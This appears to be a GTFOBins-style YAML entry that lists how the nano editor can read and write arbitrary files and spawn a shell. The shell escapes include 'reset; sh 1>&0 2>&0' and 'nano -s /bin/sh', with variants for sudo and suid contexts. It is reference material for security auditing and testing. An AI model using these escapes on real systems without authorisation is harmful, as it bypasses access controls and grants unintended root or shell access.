---
functions:
  file-read:
  - binary: false
    code: |-
      nano /path/to/input-file
    comment: |-
      The file content is displayed in the terminal interface.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      nano /path/to/output-file
      DATA
      ^O
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      nano
      ^R^X
      reset; sh 1>&0 2>&0
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      nano -s /bin/sh
      /bin/sh
      ^T^T
    comment: |-
      The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
    contexts:
      sudo:
      suid:
        code: |-
          nano -s '/bin/sh -p'
          /bin/sh -p
          ^T^T
        shell: false
      unprivileged:
...
